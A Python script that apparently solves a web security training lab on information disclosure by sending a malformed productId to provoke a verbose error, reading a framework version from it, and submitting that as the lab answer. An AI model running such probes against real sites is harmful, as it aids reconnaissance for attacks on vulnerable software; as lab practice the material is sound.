"""
    Lab: Information disclosure in error messages

    This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.

    Exploit Steps:
    1. Send a request with a malformed productId parameter to trigger an error message.
    2. Parse the error message to extract the version number of the third-party framework.
    3. Submit the extracted version number using the button provided in the lab banner.

    Author: N00BCYB0T
"""

import argparse
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Starting information disclosure attack...{Fore.RESET}")

    message = get_error_message(session)
    if message:
        version = get_version(message)
        if version:
            print(f"{Fore.GREEN}[+] Found framework version: {version}{Fore.RESET}")
            submit_solution(session, version)
        else:
            print(f"{Fore.RED}[-] Could not parse framework version from error message{Fore.RESET}")

def get_error_message(session):
    print(f"{Fore.YELLOW}[*] Triggering error message...{Fore.RESET}")
    r = session.get(f"{URL}/product?productId='")
    if r.status_code == 500:
        return r.text
    return None

def get_version(message):
    lines = message.strip().splitlines()
    if lines:
        return lines[-1]
    return None

def submit_solution(session, secret):
    print(f"{Fore.YELLOW}[*] Submitting solution...{Fore.RESET}")
    session.post(f"{URL}/submitSolution", data={"answer": secret})
    solved = session.get(f"{URL}/")
    if "Congratulations, you solved the lab!" in solved.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

if __name__ == "__main__":
    main()